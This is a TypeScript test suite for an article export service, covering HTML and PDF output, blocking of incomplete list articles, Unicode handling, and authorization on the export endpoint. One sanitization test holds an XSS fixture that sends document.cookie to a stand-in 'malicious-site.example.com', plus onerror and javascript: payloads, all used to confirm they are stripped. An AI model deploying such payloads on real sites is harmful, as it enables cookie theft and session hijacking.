import { ArticleExportService, ExportArticleInput } from '../src/lib/export/ArticleExportService';
import { POST as exportRouteHandler } from '../src/app/api/export/route';
import { setAdminAuthForTesting, setAdminFirestoreForTesting } from '../src/lib/firebase/admin';

async function runTestSuite() {
  console.log('================================================================');
  console.log('ACUTE Phase 7.1 Test Suite');
  console.log('Full Article Export, PDF Download & Incomplete Content Blocking');
  console.log('================================================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  [PASS] ${testName}`);
      passed++;
    } else {
      console.error(`  [FAIL] ${testName}${detail ? ` - ${detail}` : ''}`);
      failed++;
    }
  }

  // --- Test 1: Complete, validated article exports as standalone HTML with entire body ---
  console.log('Test 1: Complete, validated article exports as standalone HTML with entire body...');
  const completeArticleInput: ExportArticleInput = {
    title: 'The Complete Guide to Modern Frontend State Management',
    slug: 'guide-to-modern-frontend-state-management',
    content: `
      <p>State management in modern web development has evolved significantly beyond monolithic global stores. Today, engineering teams balance performance, mental overhead, and component locality to create responsive user interfaces.</p>
      <h2>Local Component State Principles</h2>
      <p>Local state should remain as close to the consuming component as possible. Managing form inputs and modal visibility locally eliminates unnecessary re-renders and simplifies automated testing across component trees.</p>
      <h2>Global State Coordination and Signals</h2>
      <p>When multiple decoupled components must share synchronization, lightweight signals and atomic primitives provide fine-grained reactivity. Subscribing only to targeted property mutations preserves application fluidity at scale.</p>
      <div class="table-container">
        <table>
          <thead><tr><th>Approach</th><th>Best For</th><th>Mental Overhead</th></tr></thead>
          <tbody>
            <tr><td>Local State</td><td>Forms and UI toggles</td><td>Low</td></tr>
            <tr><td>Atomic Signals</td><td>High-frequency cross-tree state</td><td>Moderate</td></tr>
          </tbody>
        </table>
      </div>
      <h2>Strategic Takeaways for Engineering Leads</h2>
      <p>Evaluate your application's actual data flow before adopting heavyweight state libraries. Prioritizing locality and targeted signals ensures maintainable codebases with predictable rendering performance.</p>
    `,
    metadata: {
      intent: 'Informational',
      author: 'ACUTE Engineering'
    }
  };

  const htmlOutput = ArticleExportService.generateStandaloneHtml(completeArticleInput);
  assert(htmlOutput.includes('<!DOCTYPE html>'), 'Contains <!DOCTYPE html>');
  assert(htmlOutput.includes('<html lang="en">'), 'Contains <html lang="en">');
  assert(htmlOutput.includes('<meta charset="UTF-8" />'), 'Contains <meta charset="UTF-8" />');
  assert(htmlOutput.includes('<meta name="viewport" content="width=device-width, initial-scale=1.0" />'), 'Contains responsive viewport');
  assert(htmlOutput.includes('<title>The Complete Guide to Modern Frontend State Management</title>'), 'Contains correct escaped title tag');
  assert(htmlOutput.includes('Local Component State Principles'), 'Contains section 1 heading');
  assert(htmlOutput.includes('Global State Coordination and Signals'), 'Contains section 2 heading');
  assert(htmlOutput.includes('Strategic Takeaways for Engineering Leads'), 'Contains section 3 heading');
  assert(htmlOutput.includes('<table') && htmlOutput.includes('Atomic Signals'), 'Contains styled comparison table');

  // --- Test 2: The same article exports as a nonempty, readable PDF ---
  console.log('\nTest 2: The same article exports as a nonempty, readable PDF...');
  const pdfBytes = ArticleExportService.generatePdfBuffer(completeArticleInput);
  const pdfHeader = Buffer.from(pdfBytes.slice(0, 5)).toString('utf8');
  const pdfFooter = Buffer.from(pdfBytes.slice(-100)).toString('utf8');
  assert(pdfBytes.byteLength > 2000, `PDF buffer length is substantial (${pdfBytes.byteLength} bytes)`);
  assert(pdfHeader.startsWith('%PDF-'), `PDF starts with valid %PDF- magic bytes: "${pdfHeader}"`);
  assert(pdfFooter.includes('%%EOF'), 'PDF ends with valid %%EOF marker');

  // --- Test 3: HTML and PDF contain all expected article sections ---
  console.log('\nTest 3: HTML and PDF contain all expected article sections...');
  const expectedHeadings = [
    'Local Component State Principles',
    'Global State Coordination and Signals',
    'Strategic Takeaways for Engineering Leads'
  ];
  const allHtmlHeadingsPresent = expectedHeadings.every(h => htmlOutput.includes(h));
  assert(allHtmlHeadingsPresent, 'All 3 expected headings present in HTML');
  assert(pdfBytes.byteLength > 4000, 'PDF buffer contains sufficient bytes for all 3 substantive sections and table');

  // --- Test 4: A "Top 7" article with only two alternatives is rejected for both formats ---
  console.log('\nTest 4: A "Top 7" article with only two alternatives is rejected for both formats...');
  const incompleteTop7Input: ExportArticleInput = {
    title: 'Top 7 Best Mitran Alternatives for Enhanced Team Collaboration',
    slug: 'top-7-best-mitran-alternatives',
    content: `
      <p>Finding the right collaboration platform is crucial for productivity. Here are alternatives to consider for cross-functional product and engineering teams.</p>
      <h2>1. First Alternative Tool</h2>
      <p>This platform provides team communication, kanban boards, and task tracking for software developers. It enables teams to coordinate sprints, manage backlogs, and deliver customer milestones reliably without operational confusion.</p>
      <h2>2. Second Alternative Tool</h2>
      <p>This software focuses on document collaboration, shared knowledge bases, and real-time multiplayer editing. Teams use it to document system designs, organize specifications, and share meeting takeaways across all business divisions.</p>
    `
  };

  const top7Validation = ArticleExportService.validateBeforeExport(incompleteTop7Input);
  assert(top7Validation.canExport === false, 'Blocked export of Top 7 article with only 2 items');
  assert(
    top7Validation.errors.some(e => e.includes('Title promises 7 items') && e.includes('only provides 2')),
    'Critical error specifies promise mismatch (promises 7, provides 2)'
  );

  let htmlThrew = false;
  try {
    ArticleExportService.generateStandaloneHtml(incompleteTop7Input);
  } catch (err: any) {
    htmlThrew = true;
  }
  assert(htmlThrew, 'generateStandaloneHtml threw error to prevent exporting incomplete article');

  let pdfThrew = false;
  try {
    ArticleExportService.generatePdfBuffer(incompleteTop7Input);
  } catch (err: any) {
    pdfThrew = true;
  }
  assert(pdfThrew, 'generatePdfBuffer threw error to prevent exporting incomplete PDF');

  // --- Test 5: Duplicate or empty list entries do not satisfy the promised count ---
  console.log('\nTest 5: Duplicate or empty list entries do not satisfy the promised count...');
  const duplicateAndStubInput: ExportArticleInput = {
    title: 'Top 5 Best Development Environments',
    content: `
      <p>Choosing the right IDE accelerates daily delivery for high-performance software engineering teams across diverse enterprise languages.</p>
      <h2>1. Visual Studio Code Setup</h2>
      <p>Visual Studio Code provides lightweight extensibility, integrated debugging, git integration, and a vast ecosystem of community plugins for full-stack engineering teams building web applications.</p>
      <h2>2. Visual Studio Code Setup</h2>
      <p>Visual Studio Code provides lightweight extensibility, integrated debugging, git integration, and a vast ecosystem of community plugins for full-stack engineering teams building web applications.</p>
      <h2>3. Stub Tool</h2>
      <p>Short stub.</p>
      <h2>4. JetBrains WebStorm IDE</h2>
      <p>WebStorm offers intelligent coding assistance, automated refactorings, robust typescript integration, and out-of-the-box support for modern frontend frameworks with deep code inspection tools.</p>
      <h2>5. Neovim Terminal Workflow</h2>
      <p>Neovim delivers modal text editing with asynchronous lua configuration, treesitter syntax highlighting, and minimal system resource footprint for terminal-first developers demanding maximum raw execution performance.</p>
    `
  };

  const dupValidation = ArticleExportService.validateBeforeExport(duplicateAndStubInput);
  assert(dupValidation.canExport === false, 'Blocked export containing duplicate headings and stub section');
  assert(dupValidation.errors.some(e => e.includes('Duplicate section heading')), 'Detected duplicate section heading');
  assert(dupValidation.errors.some(e => e.includes('incomplete stub') && e.includes('Stub Tool')), 'Detected stub section under 25 words');

  // --- Test 6: Missing final content cannot silently fall back to an intro, preview, or blueprint ---
  console.log('\nTest 6: Missing final content cannot silently fall back to an intro, preview, or blueprint...');
  const emptyBodyInput: ExportArticleInput = {
    title: 'Top 7 Best Alternatives for UI Designers',
    blueprint: {
      title: 'Top 7 Best Alternatives for UI Designers',
      slug: 'top-7-best-alternatives-ui-designers',
      intro: {
        hook: 'Designing intuitive interfaces requires capable software.',
        thesis: 'Teams evaluate design tools based on vector precision and prototyping.',
        business_context: 'A comparative guide for creative directors.'
      },
      sections: [],
      cta: {
        heading: 'Ready to scale?',
        description: 'Get in touch for growth services.',
        button_text: 'Get Started'
      }
    },
    content: ''
  };

  const emptyValidation = ArticleExportService.validateBeforeExport(emptyBodyInput);
  assert(emptyValidation.canExport === false, 'Blocked export of article with empty body');
  assert(emptyValidation.errors.some(e => e.includes('Article body is missing or empty')), 'Explicitly flags missing/empty body');

  // --- Test 7: Legacy and modern article schemas export correctly ---
  console.log('\nTest 7: Legacy and modern article schemas export correctly...');
  const legacyJsonArticle: ExportArticleInput = {
    title: 'Legacy Enterprise Architecture Review',
    content: JSON.stringify({
      blueprint: {
        title: 'Legacy Enterprise Architecture Review',
        slug: 'legacy-enterprise-architecture-review',
        intent: 'Commercial'
      },
      sections: [
        {
          heading: 'Microservices Decomposition Patterns',
          level: 'H2',
          what_it_is: 'Decomposing legacy monoliths into bounded context microservices requires careful schema boundary alignment and event-driven data propagation across operational boundaries.',
          why_it_works: 'Isolating service deployments prevents cross-functional release blockage and improves reliability for high-traffic transaction endpoints.'
        },
        {
          heading: 'Eventual Consistency Considerations',
          level: 'H2',
          what_it_is: 'Asynchronous event streaming requires idempotent consumer handlers and dead-letter queues to maintain distributed consistency without synchronous cross-network blocking calls.',
          why_it_works: 'Decoupling producers from immediate consumer execution preserves system availability during temporary downstream downstream dependency degradation.'
        }
      ]
    })
  };

  const legacyHtml = ArticleExportService.generateStandaloneHtml(legacyJsonArticle);
  assert(legacyHtml.includes('Microservices Decomposition Patterns'), 'Legacy JSON schema converted to full HTML section 1');
  assert(legacyHtml.includes('Eventual Consistency Considerations'), 'Legacy JSON schema converted to full HTML section 2');
  const legacyPdf = ArticleExportService.generatePdfBuffer(legacyJsonArticle);
  assert(legacyPdf.byteLength > 2000, 'Legacy JSON schema generated valid PDF buffer');

  // --- Test 8: Special characters, Unicode, links, tables, and long articles do not corrupt the exports ---
  console.log('\nTest 8: Special characters, Unicode, links, tables, and long articles do not corrupt exports...');
  const unicodeArticle: ExportArticleInput = {
    title: 'Global Currency & Typography Standards: “A Comprehensive Guide” — 2026',
    content: `
      <p>Handling diverse typographic conventions—such as smart quotes (“quote”), en-dashes (2020–2026), and em-dashes (this—or that)—is essential. Furthermore, pricing models spanning €50 EUR, £45 GBP, ¥7,000 JPY, and $60 USD must render reliably.</p>
      <h2>Internationalization Standards & Protocols</h2>
      <p>Adhering to W3C internationalization guidelines ensures consistent rendering across browsers. Refer to the official <a href="https://www.w3.org/International/">W3C I18n Working Group</a> documentation for character encoding best practices.</p>
      <div class="table-container">
        <table>
          <thead><tr><th>Region</th><th>Currency</th><th>Typical Tier</th></tr></thead>
          <tbody>
            <tr><td>European Union</td><td>€ EUR</td><td>€49/mo</td></tr>
            <tr><td>United Kingdom</td><td>£ GBP</td><td>£40/mo</td></tr>
            <tr><td>Japan</td><td>¥ JPY</td><td>¥6,500/mo</td></tr>
          </tbody>
        </table>
      </div>
      <h2>Long Article Pagination Stress Test</h2>
      <p>${'This is a comprehensive analytical paragraph designed to verify that multi-page text blocks flow seamlessly without text clipping or layout destruction. '.repeat(10)}</p>
      <p>${'Additional detailed analysis verifying consistent line spacing, margin preservation, and footer pagination numbering across multiple page boundaries. '.repeat(10)}</p>
    `
  };

  const unicodeHtml = ArticleExportService.generateStandaloneHtml(unicodeArticle);
  assert(unicodeHtml.includes('“A Comprehensive Guide”'), 'HTML preserves unicode smart quotes');
  assert(unicodeHtml.includes('€49/mo') && unicodeHtml.includes('£40/mo'), 'HTML preserves currency symbols');

  const unicodePdf = ArticleExportService.generatePdfBuffer(unicodeArticle);
  assert(unicodePdf.byteLength > 4000, 'PDF renders unicode content and tables into valid buffer');

  // --- Test 9: HTML is sanitized and PDF rendering cannot execute embedded scripts ---
  console.log('\nTest 9: HTML is sanitized and PDF rendering cannot execute embedded scripts...');
  const maliciousInput: ExportArticleInput = {
    title: 'Security Testing Payload Document',
    content: `
      <p>Normal opening paragraph describing application security assessment principles and boundaries.</p>
      <h2>Vulnerability Assessment Section</h2>
      <p>Explaining cross-site scripting risks and how automated sanitization neutralizes malicious execution vectors before content reaches end users.</p>
      <script>window.location='https://malicious-site.example.com/steal?cookie=' + document.cookie;</script>
      <img src="invalid-image.jpg" onerror="alert('xss-injected')" />
      <p><a href="javascript:alert('malicious-link')">Click Here for Free Offer</a></p>
    `
  };

  const sanitizedHtml = ArticleExportService.generateStandaloneHtml(maliciousInput);
  assert(!sanitizedHtml.includes('<script>'), 'Sanitized HTML stripped <script> tag');
  assert(!sanitizedHtml.includes('window.location'), 'Sanitized HTML stripped malicious script body');
  assert(!sanitizedHtml.includes('onerror='), 'Sanitized HTML stripped inline onerror attribute');
  assert(!sanitizedHtml.includes('href="javascript:'), 'Sanitized HTML stripped javascript: pseudo-protocol');

  // --- Test 10: Unauthenticated users cannot export private articles, and one user cannot export another user's article ---
  console.log('\nTest 10: Unauthenticated users cannot export private articles, and one user cannot export another user\'s article...');

  // Set test auth & test firestore
  const mockArticles: Record<string, any> = {
    'art_alice_doc': {
      id: 'art_alice_doc',
      userId: 'alice_123',
      ownerId: 'alice_123',
      title: 'Alice Private Document on Architecture',
      content: '<p>Private architectural designs for internal engineering eyes only.</p><h2>Architecture Details</h2><p>Here are the full architectural specifications spanning multiple backend services and deployment environments.</p>'
    },
    'art_bob_doc': {
      id: 'art_bob_doc',
      userId: 'bob_456',
      ownerId: 'bob_456',
      title: 'Bob Private Document on Security',
      content: '<p>Bob confidential notes and security credentials review.</p><h2>Security Notes</h2><p>Confidential operational security guidelines for database administration and cluster keys.</p>'
    }
  };

  setAdminAuthForTesting({
    verifyIdToken: async (token: string) => {
      if (token === 'alice_valid_token') return { uid: 'alice_123' };
      if (token === 'bob_valid_token') return { uid: 'bob_456' };
      throw new Error('Invalid test token');
    }
  });

  setAdminFirestoreForTesting({
    collection: (coll: string) => ({
      doc: (docId: string) => ({
        get: async () => ({
          exists: Boolean(mockArticles[docId]),
          id: docId,
          data: () => mockArticles[docId]
        })
      })
    })
  });

  // 10A: No auth header -> 401
  const reqNoAuth = new Request('https://example.com/api/export', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ articleId: 'art_alice_doc', format: 'html' })
  });
  const resNoAuth = await exportRouteHandler(reqNoAuth);
  assert(resNoAuth.status === 401, 'No auth header returns 401 Unauthorized');

  // 10B: Invalid token -> 401
  const reqBadToken = new Request('https://example.com/api/export', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer bad_token' },
    body: JSON.stringify({ articleId: 'art_alice_doc', format: 'html' })
  });
  const resBadToken = await exportRouteHandler(reqBadToken);
  assert(resBadToken.status === 401, 'Invalid token returns 401 Unauthorized');

  // 10C: Alice tries to export Bob's article -> 403 Forbidden
  const reqForbidden = new Request('https://example.com/api/export', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer alice_valid_token' },
    body: JSON.stringify({ articleId: 'art_bob_doc', format: 'html' })
  });
  const resForbidden = await exportRouteHandler(reqForbidden);
  assert(resForbidden.status === 403, 'Cross-user export blocked with 403 Forbidden');

  // 10D: Alice exports Alice's article -> 200 OK
  const reqAllowed = new Request('https://example.com/api/export', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer alice_valid_token' },
    body: JSON.stringify({ articleId: 'art_alice_doc', format: 'html' })
  });
  const resAllowed = await exportRouteHandler(reqAllowed);
  assert(resAllowed.status === 200, 'Owner can export own article with 200 OK');

  // --- Test 11: Export failures produce a visible error rather than an empty file or false success ---
  console.log('\nTest 11: Export failures produce a visible error rather than an empty file or false success...');
  const clientHtmlResult = ArticleExportService.downloadHtmlClient(incompleteTop7Input);
  assert(clientHtmlResult.success === false, 'downloadHtmlClient returned success: false on incomplete content');
  assert(Boolean(clientHtmlResult.error), 'downloadHtmlClient returned informative error message');

  const clientPdfResult = ArticleExportService.downloadPdfClient(incompleteTop7Input);
  assert(clientPdfResult.success === false, 'downloadPdfClient returned success: false on incomplete content');
  assert(Boolean(clientPdfResult.error), 'downloadPdfClient returned informative error message');

  // --- Test 12: A correctly grounded article for a legitimate SaaS comparison still passes ---
  console.log('\nTest 12: A correctly grounded article for a legitimate SaaS comparison still passes...');
  const legitimateSaasInput: ExportArticleInput = {
    title: 'Top 5 CRM Alternatives for Mid-Market Sales Teams',
    targetBrand: 'HubSpot',
    saasProfile: {
      name: 'HubSpot',
      businessType: 'SaaS',
      verifiedOfferings: ['CRM Software', 'Sales Hub', 'Marketing Automation']
    },
    content: `
      <p>Modern sales leaders require adaptable customer relationship management platforms that integrate lead tracking, pipeline visualization, and deal forecasting into a single operational interface across departments.</p>
      <h2>1. Salesforce Sales Cloud</h2>
      <p>Salesforce Sales Cloud delivers comprehensive enterprise CRM capabilities including complex opportunity management, territory assignment, automated quotation workflows, and deep ecosystem integrations with hundreds of operational enterprise third-party applications.</p>
      <h2>2. Pipedrive Sales Pipeline Tool</h2>
      <p>Pipedrive provides an intuitive visual pipeline interface designed to help deal-driven teams manage active stages, track sales velocity, and automate routine communication sequences across their ongoing customer conversations.</p>
      <h2>3. Zoho CRM Enterprise</h2>
      <p>Zoho CRM offers omnichannel customer engagement, AI-driven deal predictions, canvas visual customization, and unified data sharing across customer support, billing suites, and finance departments worldwide.</p>
      <h2>4. ActiveCampaign Revenue Platform</h2>
      <p>ActiveCampaign unifies marketing automation with sales deal tracking, providing dynamic lead scoring, automated task assignment, and trigger-based customer re-engagement sequences that keep active prospects engaged over time.</p>
      <h2>5. Freshsales Modern Suite</h2>
      <p>Freshsales combines AI-powered contact scoring, built-in cloud telephony, deal rot prevention alerts, and unified activity timelines for fast-growing sales organizations scaling their client acquisitions across competitive regional and global business sectors.</p>
      <h2>Final Strategic Evaluation</h2>
      <p>When selecting a CRM alternative, benchmark evaluation criteria against your team's sales cycle duration and integration requirements. Start your 14-day free trial now to evaluate features in your environment.</p>
    `
  };

  const saasValidation = ArticleExportService.validateBeforeExport(legitimateSaasInput);
  assert(saasValidation.canExport === true, 'Legitimate SaaS comparison with 5 full items passes validation');
  assert(saasValidation.errors.length === 0, 'Zero critical errors for legitimate SaaS comparison');
  const saasHtml = ArticleExportService.generateStandaloneHtml(legitimateSaasInput);
  assert(saasHtml.includes('Freshsales Modern Suite'), 'Exported SaaS HTML includes all 5 alternatives');
  const saasPdf = ArticleExportService.generatePdfBuffer(legitimateSaasInput);
  assert(saasPdf.byteLength > 4000, 'Exported SaaS PDF generated complete multi-page document');

  // Reset test mocks
  setAdminAuthForTesting(null);
  setAdminFirestoreForTesting(null);

  console.log('\n================================================================');
  console.log(`Summary: ${passed} passed, ${failed} failed.`);
  console.log('================================================================');

  if (failed > 0) {
    process.exit(1);
  }
}

runTestSuite().catch(err => {
  console.error('Fatal error running test suite:', err);
  process.exit(1);
});
